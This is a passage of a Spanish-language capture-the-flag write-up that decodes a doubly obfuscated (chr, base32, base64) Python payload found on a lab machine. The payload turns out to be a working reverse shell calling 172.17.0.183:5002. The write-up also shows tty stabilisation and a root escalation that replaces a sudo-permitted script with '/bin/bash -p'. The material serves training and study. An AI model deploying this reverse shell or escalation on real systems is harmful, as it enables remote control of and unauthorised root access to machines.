chr(76), chr(72), chr(74), chr(70), chr(66), chr(85), chr(67), chr(90), chr(50), chr(74), chr(73), chr(78), chr(65), chr(87), chr(79), chr(83), chr(75), chr(68), chr(73), chr(70), chr(84), chr(85), chr(83), chr(81), chr(50), chr(66), chr(77), chr(53), chr(69), chr(85), chr(71), chr(81), chr(76), chr(72), chr(74), chr(70), chr(66), chr(85), chr(67), chr(90), chr(50), chr(74), chr(73), chr(78), chr(65), chr(87), chr(79), chr(83), chr(75), chr(68), chr(73), chr(70), chr(84), chr(87), chr(71), chr(77), chr(50), chr(83), chr(78), chr(78), chr(82), chr(68), chr(71), chr(86), chr(82), chr(81), chr(75), chr(66), chr(77), chr(69), chr(52), chr(77), chr(75), chr(90), chr(78), chr(90), chr(66), chr(72), chr(83), chr(89), chr(82), chr(83), chr(74), chr(90), chr(87), chr(65), chr(85), chr(89), chr(90), chr(84), chr(74), chr(86), chr(50), chr(86), chr(75), chr(82), chr(76), chr(77), chr(75), chr(70), chr(74), chr(70), chr(71), chr(53), chr(51), chr(72), chr(77), chr(77), chr(90), chr(86), chr(69), chr(50), chr(50), chr(50), chr(76), chr(66), chr(70), chr(72), chr(83), chr(85), chr(67), chr(89), chr(74), chr(89), chr(89), chr(86), chr(83), chr(51), chr(83), chr(67), chr(80), chr(70), chr(82), chr(68), chr(69), chr(84), chr(84), chr(77), chr(77), chr(77), chr(90), chr(85), chr(50), chr(53), chr(75), chr(86), chr(73), chr(86), chr(87), chr(70), chr(67), chr(85), chr(83), chr(84), chr(79), chr(53), chr(70), chr(85), chr(83), chr(81), chr(50), chr(66), chr(77), chr(53), chr(69), chr(85), chr(71), chr(81), chr(76), chr(72), chr(74), chr(70), chr(66), chr(85), chr(67), chr(90), chr(50), chr(74), chr(73), chr(78), chr(65), chr(87), chr(79), chr(83), chr(75), chr(68), chr(73), chr(70), chr(84), chr(85), chr(83), chr(81), chr(50), chr(66), chr(77), chr(53), chr(69), chr(85), chr(71), chr(81), chr(76), chr(72), chr(74), chr(70), chr(66), chr(85), chr(67), chr(90), chr(89), chr(75), chr(74), chr(70), chr(66), chr(85), chr(67), chr(90), chr(50), chr(74), chr(73), chr(78), chr(65), chr(87), chr(79), chr(83), chr(75), chr(68), chr(73), chr(74), chr(53), chr(71), chr(73), chr(82), chr(50), chr(83), chr(79), chr(66), chr(82), chr(71), chr(85), chr(77), chr(76), chr(50), chr(77), chr(82), chr(76), chr(85), chr(85), chr(53), chr(51), chr(68), chr(78), chr(85), chr(52), chr(87), chr(85), chr(87), chr(83), chr(89), chr(74), chr(90), chr(53), chr(69), chr(89), chr(51), chr(67), chr(67), chr(74), chr(74), chr(75), chr(85), chr(75), chr(86), chr(76), chr(81), chr(73), chr(78), chr(85), chr(85), chr(67), chr(90), chr(50), chr(74), chr(73), chr(78), chr(65), chr(87), chr(79), chr(83), chr(75), chr(68), chr(73), chr(70), chr(84), chr(87), chr(71), chr(77), chr(50), chr(83), chr(78), chr(78), chr(82), chr(68), chr(71), chr(86), chr(82), chr(81), chr(76), chr(65), chr(90), chr(86), chr(85), chr(50), chr(68), chr(67), chr(74), chr(66), chr(76), chr(71), chr(89), chr(83), chr(75), chr(69), chr(71), chr(66), chr(84), chr(87), chr(71), chr(83), chr(67), chr(75), chr(79), chr(89), chr(70), chr(70), chr(83), chr(54), chr(74), chr(86), chr(80), chr(74), chr(83), chr(69), chr(79), chr(85), chr(84), chr(87), chr(77), chr(82), chr(77), chr(70), chr(67), chr(53), chr(76), chr(68), chr(78), chr(86), chr(76), chr(71), chr(81), chr(87), chr(83), chr(68), chr(77), chr(53), chr(89), chr(69), chr(83), chr(81), chr(51), chr(84), chr(77), chr(53), chr(82), chr(85), chr(81), chr(83), chr(84), chr(87), chr(76), chr(70), chr(52), chr(84), chr(75), chr(54), chr(84), chr(69), chr(73), chr(53), chr(74), chr(71), chr(89), chr(89), chr(51), chr(79), chr(74), chr(70), chr(50), chr(87), chr(71), chr(51), chr(75), chr(87), chr(78), chr(66), chr(78), chr(69), chr(71), chr(90), chr(51), chr(81), chr(73), chr(78), chr(85), chr(85), chr(67), chr(90), chr(50), chr(74), chr(73), chr(78), chr(65), chr(87), chr(79), chr(83), chr(75), chr(68), chr(73), chr(70), chr(84), chr(87), chr(71), chr(54), chr(74), chr(86), chr(80), chr(74), chr(78), chr(70), chr(79), chr(78), chr(76), chr(76), chr(74), chr(78), chr(69), chr(69), chr(52), chr(77), chr(67), chr(50), chr(73), chr(52), chr(52), chr(84), chr(67), chr(67), chr(84), chr(69), chr(73), chr(89), chr(52), chr(84), chr(69), chr(87), chr(75), chr(88), chr(80), chr(65), chr(89), chr(86), chr(85), chr(85), chr(51), chr(76), chr(74), chr(78), chr(69), chr(85), chr(71), chr(81), chr(76), chr(72), chr(74), chr(70), chr(66), chr(85), chr(67), chr(90), chr(50), chr(74), chr(73), chr(78), chr(66), chr(72), chr(83), chr(87), chr(83), chr(89), chr(75), chr(73), chr(89), chr(87), chr(71), chr(51), chr(74), chr(85), chr(77), chr(53), chr(74), chr(71), chr(50), chr(82), chr(84), chr(84), chr(77), chr(77), chr(90), chr(70), chr(75), chr(83), chr(50), chr(68), chr(78), chr(86), chr(74), chr(71), chr(89), chr(87), chr(84), chr(74), chr(73), chr(74), chr(50), chr(70), chr(83), chr(86), chr(51), chr(77), chr(79), chr(86), chr(70), chr(85), chr(71), chr(50), chr(90), chr(87), chr(73), chr(78), chr(85), chr(85), chr(67), chr(90), chr(50), chr(74), chr(73), chr(78), chr(66), chr(68), chr(71), chr(89), chr(75), chr(72), chr(78), chr(82), chr(90), chr(86), chr(85), chr(85), chr(50), chr(67), chr(75), chr(86), chr(82), chr(87), chr(52), chr(86), chr(84), chr(77), chr(66), chr(74), chr(72), chr(87), chr(79), chr(51), chr(51), chr(72), chr(74), chr(70), chr(66), chr(85), chr(67), chr(90), chr(50), chr(74), chr(73), chr(78), chr(65), chr(87), chr(79), chr(83), chr(75), chr(73), chr(74), chr(90), chr(51), chr(70), chr(83), chr(77), chr(84), chr(85), chr(78), chr(82), chr(83), chr(69), chr(77), chr(79), chr(76), chr(76), chr(77), chr(70), chr(76), chr(86), chr(77), chr(50), chr(50), chr(74), chr(73), chr(81), chr(89), chr(71), chr(79), chr(85), chr(84), chr(78), chr(73), chr(90), chr(90), chr(87), chr(71), chr(77), chr(83), chr(86), chr(74), chr(78), chr(69), chr(85), chr(71), chr(81), chr(76), chr(72), chr(74), chr(70), chr(66), chr(85), chr(67), chr(90), chr(50), chr(74), chr(73), chr(78), chr(66), chr(68), chr(65), chr(89), chr(51), chr(79), chr(78), chr(77), chr(51), chr(69), chr(71), chr(50), chr(75), chr(66), chr(77), chr(53), chr(69), chr(85), chr(71), chr(81), chr(76), chr(72), chr(74), chr(70), chr(66), chr(85), chr(67), chr(90), chr(50), chr(74), chr(73), chr(78), chr(65), chr(87), chr(79), chr(83), chr(75), chr(73), chr(74), chr(86), chr(84), chr(81), chr(85), chr(85), chr(67), chr(84), chr(73), chr(74), chr(86), chr(71), chr(69), chr(77), chr(82), chr(86), chr(79), chr(86), chr(78), chr(70), chr(79), chr(84), chr(82), chr(81), chr(74), chr(78), chr(67), chr(87), chr(81), chr(85), chr(67), chr(86), chr(71), chr(70), chr(73), chr(88), chr(71), chr(83), chr(75), chr(71), chr(73), chr(74), chr(73), chr(70), chr(75), chr(51), chr(67), chr(82), chr(79), chr(66), chr(66), chr(87), chr(83), chr(81), chr(76), chr(72), chr(74), chr(70), chr(66), chr(85), chr(67), chr(90), chr(50), chr(74), chr(73), chr(78), chr(65), chr(87), chr(79), chr(83), chr(75), chr(68), chr(73), chr(70), chr(84), chr(85), chr(83), chr(83), chr(68), chr(69), chr(78), chr(53), chr(81), chr(86), chr(79), chr(54), chr(68), chr(77), chr(74), chr(70), chr(68), chr(84), chr(75), chr(53), chr(84), chr(69), chr(73), chr(78), chr(66), chr(72), chr(85), chr(89), chr(82), chr(83), chr(74), chr(90), chr(90), chr(70), chr(85), chr(87), chr(67), chr(83), chr(77), chr(90), chr(78), chr(69), chr(79), chr(51), chr(68), chr(77), chr(76), chr(74), chr(67), chr(71), chr(54), chr(83), chr(89), chr(75), chr(74), chr(70), chr(66), chr(85), chr(67), chr(90), chr(50), chr(74), chr(73), chr(78), chr(65), chr(87), chr(79), chr(83), chr(75), chr(68), chr(73), chr(70), chr(84), chr(85), chr(83), chr(81), chr(50), chr(66), chr(77), chr(53), chr(69), chr(85), chr(71), chr(81), chr(76), chr(72), chr(74), chr(70), chr(69), chr(69), chr(52), chr(53), chr(83), chr(90), chr(71), chr(74), chr(50), chr(71), chr(89), chr(90), chr(67), chr(71), chr(72), chr(70), chr(86), chr(87), chr(67), chr(86), chr(50), chr(87), chr(78), chr(78), chr(69), chr(85), chr(73), chr(77), chr(68), chr(72), chr(77), chr(81), chr(90), chr(69), chr(77), chr(52), chr(68), chr(69), chr(73), chr(89), chr(52), chr(87), chr(50), chr(89), chr(82), chr(84), chr(74), chr(74), chr(84), chr(70), chr(83), chr(77), chr(82), chr(90), chr(79), chr(82), chr(82), chr(70), chr(79), chr(82), chr(84), chr(86), chr(76), chr(74), chr(66), chr(87), chr(81), chr(54), chr(83), chr(76), chr(75), chr(70), chr(88), chr(87), chr(79), chr(83), chr(75), chr(68), chr(73), chr(70), chr(84), chr(85), chr(83), chr(81), chr(50), chr(66), chr(77), chr(52), chr(70), chr(69), chr(83), chr(81), chr(50), chr(66), chr(77), chr(53), chr(69), chr(85), chr(71), chr(81), chr(84), chr(50), chr(74), chr(82), chr(87), chr(85), chr(52), chr(52), chr(51), chr(67), chr(71), chr(78), chr(72), chr(71), chr(89), chr(83), chr(50), chr(68), chr(78), chr(78), chr(70), chr(85), chr(83), chr(81), chr(50), chr(66), chr(77), chr(53), chr(69), chr(85), chr(71), chr(81), chr(76), chr(72), chr(74), chr(70), chr(66), chr(85), chr(69), chr(51), chr(68), chr(70), chr(73), chr(53), chr(72), chr(71), chr(89), chr(89), chr(50), chr(73), chr(75), chr(70), chr(84), chr(87), chr(71), chr(77), chr(82), chr(90), chr(78), chr(74), chr(81), chr(84), chr(69), chr(86), chr(82), chr(81), chr(74), chr(82), chr(87), chr(86), chr(77), chr(54), chr(76), chr(68), chr(78), chr(85), chr(52), chr(88), chr(83), chr(84), chr(51), chr(72), chr(78), chr(53), chr(84), chr(85), chr(83), chr(81), chr(50), chr(66), chr(77), chr(53), chr(69), chr(85), chr(71), chr(81), chr(76), chr(72), chr(74), chr(70), chr(66), chr(85), chr(67), chr(90), chr(50), chr(74), chr(73), chr(78), chr(66), chr(72), chr(79), chr(67), chr(83), chr(90), chr(76), chr(66), chr(72), chr(72), chr(85), chr(81), chr(51), chr(74), chr(73), chr(70), chr(84), chr(85), chr(83), chr(81), chr(50), chr(66), chr(77), chr(53), chr(69), chr(85), chr(71), chr(81), chr(76), chr(72), chr(77), chr(82), chr(68), chr(87), chr(89), chr(53), chr(67), chr(50), chr(75), chr(77), chr(50), chr(88), chr(85), chr(89), chr(83), chr(72), chr(75), chr(90), chr(87), chr(71), chr(71), chr(81), chr(51), chr(72), chr(71), chr(70), chr(70), chr(86), chr(67), chr(51), chr(50), chr(76), chr(77), chr(70), chr(76), chr(86), chr(83), chr(90), chr(50), chr(89), chr(71), chr(69), chr(52), chr(88), chr(75), chr(87), chr(75), chr(88), chr(71), chr(70), chr(87), chr(70), chr(81), chr(77), chr(74), chr(89), chr(77), chr(53), chr(73), chr(70), chr(73), chr(77), chr(68), chr(72), chr(74), chr(70), chr(87), chr(68), chr(83), chr(90), chr(84), chr(67), chr(75), chr(53), chr(68), chr(72), chr(65), chr(89), chr(84), chr(77), chr(72), chr(70), chr(84), chr(69), chr(83), chr(50), chr(84), chr(80), chr(74), chr(78), chr(69), chr(85), chr(71), chr(81), chr(76), chr(72), chr(66), chr(74), chr(69), chr(85), chr(81), chr(84), chr(82), chr(86), chr(77), chr(78), chr(52), chr(84), chr(75), chr(51), chr(68), chr(70), chr(73), chr(53), chr(87), chr(68), chr(65), chr(83), chr(50), chr(72), chr(71), chr(70), chr(85), chr(71), chr(67), chr(86), chr(90), chr(85), chr(78), chr(53), chr(70), chr(86), chr(71), chr(50), chr(50), chr(76), chr(66), chr(73), chr(61), chr(61), chr(61), chr(61), chr(61), chr(61), chr(39), chr(41), chr(41), chr(41)]))
```
el script de python contiene esta informacion que es totalmente ilegible, pero despues de una investigacion de la funcion `chr` el script puede estar codificado en su representacion en `ASCII`
asi que necesito estraer solo los nuemeros que contiene este script (pero manual es mucho trabajo) para luego decodificarlo y para extraer esta informacion puedo hacerlo mediante un script bash que creare para dicho fin,
pero primero necesito crear un archivo con el mismo contenido del script python en el directorio del user `darksblack` donde estara tambien el script en bash que extraera la informacion que necesito


script para extraer los numeros del script en python
```bash
#!/bin/bash
# Archivo de entrada
input_file="script.py"

# Leer el contenido del archivo, extraer solo los números y separarlos por espacios
grep -o '[0-9]\+' "$input_file" | paste -sd " " - > numeros.txt

echo "Los números han sido extraídos y guardados en numeros.txt"
```
lo guardo como `extraerinfo.sh`

![image](https://github.com/user-attachments/assets/f817b6ef-fa6d-46c4-b4d4-c223a44a45ca)

ya tengo los 2 script, tanto la copia del de python como el que usare para la extraccion de los numeros que necesito, asi que lo ejecuto 

![image](https://github.com/user-attachments/assets/7c4f3f9f-0826-4faa-989f-5c9de53290b4)

ya extraida la informacion voy a la web en busca de un decodificador `ASCII` `https://seostudio.tools/es/ascii-to-text`

![image](https://github.com/user-attachments/assets/0cb1eae1-315e-4d7a-b7d5-1deefca8e8cb)

obtengo el siguiente resultado

```bash
import base64; exec(base64.b64decode(base64.b32decode('MFLTC53CGNFDASKIJY2WG53QOBRFQQTWMNXFCZ3CGNGUWYKXGF3WEM2KGBEUQTRRLFXEE6LCGJHGYYZTJVFWCVZRO5RDGSRQJFEE45SZGJ2GYZCBOBYGEWCCOYFGG3SRM5SEO3DULJIW6S2TIU4VIVSDIE4USQ2JPBHHUSLVJVKGG5KNIM2HQT2EJVUUG3CCKBKWYULHKBJUCMKNIRAXSQ3HOBVVUV2ZM5MTEOLVMJWVM2TEINUG6CTCGNHDATCDIJ3WEM2KGBFVI32LJFBUCZ2JJBGWOUCTIJ5GEMSOOJNFQULVMMZDS2TBGJLDAS2IJZ3FSMTUNRSEGNKCKJWDSSSUNNLFKTCDIJ5GEMSOOJNFQULVBJKTAOKEKMYTSVCWIZFEMUKVGBYEG2KBM5EUGQT2JRWU45TCNU2WYWJTKFXUWR3IOZRTGULTJFEEE5TDNZIXAS2RN5TUSQ2BM5RW2VRQMRMEU5KJJBGUWQ3NKJWAUWTJIIZVSV3MGBMDEWTWMNWDS2TCGIYXIWKXGVVUWSCNOBHWO33HJFBUCZ22I5DDAWKTIE4USSCNOVRW2VTKMRUWO6CNIRETAS2RN5TUSQ2BM5QVOWLHLJDUMMAKLFJUCOKQKNAWSY2YKZYGIRTYOVEWU32LJFBUCZ2JINAWOSKDIJ5EY3KOONRDGTTMJNBWWS2JINAWOSKDIFTUSQ2CPJSVQTLVLJMGQ4DEINTXOS2RN5TUSQ2BM4FES6KCGBQUOVLHMMZDS2TBGJLDASKHKJYFUV2RJNEUGQLHJFDVM43BK5MWOYSHKZ2UWR2SNBSEORLQJFCDAOKJIRATMQ3JIFTUSQ2BM5EUGQLHMNWVMMDELBFHKCSJIZJHSZCXKVFUSQ2BM5EUOVTTMMZFKNSDM5XWOSKDIFTUSQ2BM5EUQQTZMIZE2Z2QKNBHUZCXJJ3WG3JZNJNFQTT2JRWEE5TDI5LHKS2HKJUGIR2FONEUQTTPBJNFO6DTKBLFE6LEK5KXGQ3JIFTUSQ2BM5EUGQLHJFBUCZ2JINAWOSKDIFTUSQ2BM5EUGQLHJFBUCZ2JINAWOSKDIFTWGM2SNNRDGVRQKBME4MKZNZBHSYRSJZWAUYZTJV2VKRLMKFJFG53HMMZVE222LBFHSUCYJYYVS3SCPFRDETTMMMZU25KVIVWFCUSTO5FUSQ2BM5EUGQLHJFBUCZ2JINAWOSKDIFTUSQ2BM5EUGQLHJFBUCZYKJFBUCZ2JINAWOSKDIJ5GIR2SOBRGUML2MRLUU53DNU4WUWSYJZ5EY3CCJJKUKVLQINUUCZ2JINAWOSKDIFTWGM2SNNRDGVRQLAZVU2DCJBLGYSKEGBTWGSCKOYFFS6JVPJSEOUTWMRMFC5LDNVLGQWSDM5YESQ3TM5RUQSTWLF4TK6TEI5JGYY3OJF2WG3KWNBNEGZ3QINUUCZ2JINAWOSKDIFTWG6JVPJNFONLLJNEE4MC2I44TCCTEIY4TEWKXPAYVUU3LJNEUGQLHJFBUCZ2JINBHSWSYKIYWG3JUM5JG2RTTMMZFKS2DNVJGYWTJIJ2FSV3MOVFUG2ZWINUUCZ2JINBDGYKHNRZVUU2CKVRW4VTMBJHWO33HJFBUCZ2JINAWOSKIJZ3FSMTUNRSEMOLLMFLVM22JIQYGOUTNIZZWGMSVJNEUGQLHJFBUCZ2JINBDAY3ONM3EG2KBM5EUGQLHJFBUCZ2JINAWOSKIJVTQUUCTIJVGEMRVOVNFOTRQJNCWQUCVGFIXGSKGIJIFK3CROBBWSQLHJFBUCZ2JINAWOSKDIFTUSSDEN5QVO6DMJFDTK5TEINBHUYRSJZZFUWCSMZNEO3DMLJCG6SYKJFBUCZ2JINAWOSKDIFTUSQ2BM5EUGQLHJFEE45SZGJ2GYZCGHFVWCV2WNNEUIMDHMQZEM4DEIY4W2YRTJJTFSMRZORRFORTVLJBWQ6SLKFXWOSKDIFTUSQ2BM4FESQ2BM5EUGQT2JRWU443CGNHGYS2DNNFUSQ2BM5EUGQLHJFBUE3DFI5HGYY2IKFTWGMRZNJQTEVRQJRWVM6LDNU4XST3HN5TUSQ2BM5EUGQLHJFBUCZ2JINBHOCSZLBHHUQ3JIFTUSQ2BM5EUGQLHMRDWY5C2KM2XUYSHKZWGGQ3HGFFVC32LMFLVSZ2YGE4XKWKXGFWFQMJYM5IFIMDHJFWDSZTCK5DHAYTMHFTES2TPJNEUGQLHBJEUQTRVMN4TK3DFI5WDAS2HGFUGCVZUN5FVG22LBI======')))
```

que por lo visto esta codeado ahora en base32 y 64, asi que copio la cadena codeada y de decodifico

```bash
echo 'MFLTC53CGNFDASKIJY2WG53QOBRFQQTWMNXFCZ3CGNGUWYKXGF3WEM2KGBEUQTRRLFXEE6LCGJHGYYZTJVFWCVZRO5RDGSRQJFEE45SZGJ2GYZCBOBYGEWCCOYFGG3SRM5SEO3DULJIW6S2TIU4VIVSDIE4USQ2JPBHHUSLVJVKGG5KNIM2HQT2EJVUUG3CCKBKWYULHKBJUCMKNIRAXSQ3HOBVVUV2ZM5MTEOLVMJWVM2TEINUG6CTCGNHDATCDIJ3WEM2KGBFVI32LJFBUCZ2JJBGWOUCTIJ5GEMSOOJNFQULVMMZDS2TBGJLDAS2IJZ3FSMTUNRSEGNKCKJWDSSSUNNLFKTCDIJ5GEMSOOJNFQULVBJKTAOKEKMYTSVCWIZFEMUKVGBYEG2KBM5EUGQT2JRWU45TCNU2WYWJTKFXUWR3IOZRTGULTJFEEE5TDNZIXAS2RN5TUSQ2BM5RW2VRQMRMEU5KJJBGUWQ3NKJWAUWTJIIZVSV3MGBMDEWTWMNWDS2TCGIYXIWKXGVVUWSCNOBHWO33HJFBUCZ22I5DDAWKTIE4USSCNOVRW2VTKMRUWO6CNIRETAS2RN5TUSQ2BM5QVOWLHLJDUMMAKLFJUCOKQKNAWSY2YKZYGIRTYOVEWU32LJFBUCZ2JINAWOSKDIJ5EY3KOONRDGTTMJNBWWS2JINAWOSKDIFTUSQ2CPJSVQTLVLJMGQ4DEINTXOS2RN5TUSQ2BM4FES6KCGBQUOVLHMMZDS2TBGJLDASKHKJYFUV2RJNEUGQLHJFDVM43BK5MWOYSHKZ2UWR2SNBSEORLQJFCDAOKJIRATMQ3JIFTUSQ2BM5EUGQLHMNWVMMDELBFHKCSJIZJHSZCXKVFUSQ2BM5EUOVTTMMZFKNSDM5XWOSKDIFTUSQ2BM5EUQQTZMIZE2Z2QKNBHUZCXJJ3WG3JZNJNFQTT2JRWEE5TDI5LHKS2HKJUGIR2FONEUQTTPBJNFO6DTKBLFE6LEK5KXGQ3JIFTUSQ2BM5EUGQLHJFBUCZ2JINAWOSKDIFTUSQ2BM5EUGQLHJFBUCZ2JINAWOSKDIFTWGM2SNNRDGVRQKBME4MKZNZBHSYRSJZWAUYZTJV2VKRLMKFJFG53HMMZVE222LBFHSUCYJYYVS3SCPFRDETTMMMZU25KVIVWFCUSTO5FUSQ2BM5EUGQLHJFBUCZ2JINAWOSKDIFTUSQ2BM5EUGQLHJFBUCZYKJFBUCZ2JINAWOSKDIJ5GIR2SOBRGUML2MRLUU53DNU4WUWSYJZ5EY3CCJJKUKVLQINUUCZ2JINAWOSKDIFTWGM2SNNRDGVRQLAZVU2DCJBLGYSKEGBTWGSCKOYFFS6JVPJSEOUTWMRMFC5LDNVLGQWSDM5YESQ3TM5RUQSTWLF4TK6TEI5JGYY3OJF2WG3KWNBNEGZ3QINUUCZ2JINAWOSKDIFTWG6JVPJNFONLLJNEE4MC2I44TCCTEIY4TEWKXPAYVUU3LJNEUGQLHJFBUCZ2JINBHSWSYKIYWG3JUM5JG2RTTMMZFKS2DNVJGYWTJIJ2FSV3MOVFUG2ZWINUUCZ2JINBDGYKHNRZVUU2CKVRW4VTMBJHWO33HJFBUCZ2JINAWOSKIJZ3FSMTUNRSEMOLLMFLVM22JIQYGOUTNIZZWGMSVJNEUGQLHJFBUCZ2JINBDAY3ONM3EG2KBM5EUGQLHJFBUCZ2JINAWOSKIJVTQUUCTIJVGEMRVOVNFOTRQJNCWQUCVGFIXGSKGIJIFK3CROBBWSQLHJFBUCZ2JINAWOSKDIFTUSSDEN5QVO6DMJFDTK5TEINBHUYRSJZZFUWCSMZNEO3DMLJCG6SYKJFBUCZ2JINAWOSKDIFTUSQ2BM5EUGQLHJFEE45SZGJ2GYZCGHFVWCV2WNNEUIMDHMQZEM4DEIY4W2YRTJJTFSMRZORRFORTVLJBWQ6SLKFXWOSKDIFTUSQ2BM4FESQ2BM5EUGQT2JRWU443CGNHGYS2DNNFUSQ2BM5EUGQLHJFBUE3DFI5HGYY2IKFTWGMRZNJQTEVRQJRWVM6LDNU4XST3HN5TUSQ2BM5EUGQLHJFBUCZ2JINBHOCSZLBHHUQ3JIFTUSQ2BM5EUGQLHMRDWY5C2KM2XUYSHKZWGGQ3HGFFVC32LMFLVSZ2YGE4XKWKXGFWFQMJYM5IFIMDHJFWDSZTCK5DHAYTMHFTES2TPJNEUGQLHBJEUQTRVMN4TK3DFI5WDAS2HGFUGCVZUN5FVG22LBI======' |base32 -d |base64 -d
```
```bash
import sys
import os
import subprocess
import socket
import time

HOST = "172.17.0.183"
PORT = 5002

def connect(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    return s

def wait_for_command(s):
    data = s.recv(1024)
    if data == "quit\n":
        s.close()
        sys.exit(0)
    # the socket died
    elif len(data) == 0:
        return True
    else:

        proc = subprocess.Popen(data, shell=True,
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                stdin=subprocess.PIPE)
        stdout_value = proc.stdout.read() + proc.stderr.read()
        s.send(stdout_value)
        return False

def main():
    while True:
        socket_died = False
        try:
            s = connect(HOST, PORT)
            while not socket_died:
                socket_died = wait_for_command(s)
            s.close()
        except socket.error:
            pass
        time.sleep(5)

if __name__ == "__main__":
    sys.exit(main())
```

resulta que es una revershell que estaba ofuscada en 2 niveles, los datos de interes son a que ip y puerto envia la `revershell`

```bash
ip = 172.17.0.183
port = 5002
```
para poder tomar esta revershell necesito cambiar de ip por la de la revershell y ponerme en escucha por el puerto 5002 a la vez que ejecuto el script python en el servidor como el user `juan`
(primero ejecuto el script python en el servidor y despues cambio de ip en mi maquina atacante)

![image](https://github.com/user-attachments/assets/fdfcf640-a5ee-42ad-be1d-602ba2d89d33)

al rato de un tiempo por alguna razon se termina la conexion por lo que vuelvo a lanzar la revershell desde el servidor y al obtener la conexion envia una nueva revershell a otro puerto

![image](https://github.com/user-attachments/assets/fb069869-9d45-47c8-96d8-d808e097e4e0)


### juan

tratamiento de la tty

```ruby
export TERM=xterm
export SHELL=bash
script /dev/null -c bash 
^Z
stty raw -echo; fg
reset xterm
stty rows 38 columns 168
```

![image](https://github.com/user-attachments/assets/c8c98146-39f1-4f79-bb51-886e504eeef4)

en el directorio del user `juan` se encuentra un nuevo script el cual no puede leer por falta de permisos (pertenece a root), asi que chequeo los procesos a ver si dicho script esta siendo ejecutado por `root`
pero no es asi, y si ejecuto un `sudo -l` 

![image](https://github.com/user-attachments/assets/3ca79a5e-7db0-4e8f-bfd0-0a0b2805112a)

puedo ejecutar el script `mensaje.sh` como `root` y aunque el script pertenece a `root` lo puedo eliminar por estar en mi directorio y crear un nuevo script malicioso
con el mismo nombre y asi lograr escalar hasta root:

```ruby
rm mensajes.sh # elimino el script original
echo '/bin/bash -p' > mensajes.sh # creo el script malicioso que ejecute una bash
chmod +x mensajes.sh # le doy permiso de ejecucion
sudo -u root /home/juan/mensajes.sh # escalamos root
```

### `ROOT`

![image](https://github.com/user-attachments/assets/6aeeee18-a829-41e3-9c2b-2d18aff13b15)



















